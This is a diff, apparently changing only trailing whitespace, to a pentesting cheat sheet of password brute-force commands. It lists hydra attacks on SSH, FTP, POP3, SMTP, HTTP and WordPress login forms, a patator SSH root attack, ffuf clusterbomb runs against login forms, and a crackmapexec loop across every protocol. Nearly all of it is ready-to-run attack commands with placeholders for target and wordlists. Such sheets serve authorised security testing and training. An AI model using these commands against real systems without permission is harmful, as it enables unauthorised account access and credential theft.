@@ -1,8 +1,8 @@
 % Bruteforce Cheats
 
-$ wordlist: fdfind . "$(pwd)" /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u 
-$ user-list: fdfind . "$(pwd)" /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u 
-$ pass-list: fdfind . "$(pwd)" /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u 
+$ wordlist: fdfind . "$(pwd)" /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u
+$ user-list: fdfind . "$(pwd)" /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u
+$ pass-list: fdfind . "$(pwd)" /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u
 $ list-hydras-functionality: hydra -h | grep 'Supported' | tr ' ' '\n' | tail -n +3
 
 
@@ -14,7 +14,7 @@ hydra <ip> -s 22 ssh -l <user-list> -P <pass-list>
 hydra -v -V -u -L <user-list> -P <pass-list> -t 1 -u <ip> ssh
 
 # Hydra SSH using a known password and a username list
-hydra -v -V -u -L <user-list> -p 'known-password' -t 1 -u <ip> ssh 
+hydra -v -V -u -L <user-list> -p 'known-password' -t 1 -u <ip> ssh
 
 # patator ssh brutefoce 22 with username root
 patator ssh_login host=<ip> port=22 user=root password=FILE0 0=<pass-list> --allow-ignore-failures persistent=0 -x ignore:egrep="Authentication failed."
@@ -27,7 +27,7 @@ hydra -L <user-list> -P <pass-list> <ip> <list-hydras-functionality> -V -f
 hydra -t 1 -l admin -P <pass-list> -vV <ip> ftp
 
 # Hydra POP3 Brute Force
-hydra -l <username> -P <pass-list> -f <ip> pop3 -V 
+hydra -l <username> -P <pass-list> -f <ip> pop3 -V
 
 # Hydra SMTP Brute Force
 hydra -P <pass-list> <ip> smtp -V
@@ -55,10 +55,10 @@ hydra -L <user-list> -P <pass-list> <ip> http-get /admin
 hydra -l admin -P <pass-list> <ip> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 
 # post header bruteforce FUFF clusterbomb
-ffuf -w <user-list>:USERFUZZ -w <pass-list>:PASSWORDFUZZ -u <url> -d "username=USERFUZZ&password=PASSWORDFUZZ" -H "Content-type: application/x-www-form-urlencoded" -mode clusterbomb 
+ffuf -w <user-list>:USERFUZZ -w <pass-list>:PASSWORDFUZZ -u <url> -d "username=USERFUZZ&password=PASSWORDFUZZ" -H "Content-type: application/x-www-form-urlencoded" -mode clusterbomb
 
 # FUFF clusterbomb with an request from burp (sed -i 's/your-value-what-needs-to-be-fuzzed/DIRECTORYATTACK/g')
-ffuf -request <request> -w <wordlist>:DIRECTORYATTACK -request-proto http 
+ffuf -request <request> -w <wordlist>:DIRECTORYATTACK -request-proto http
 
 # crackmapexec let's do every protocol (slow)
 for i in $(cme | grep '{' | tail -n 1 | cut -d '{' -f 2 | cut -d '}' -f 1 | tr ',' '\n'); do cme $i <ip> -d <domain> -u '<user-list>' -p <pass-list>;done
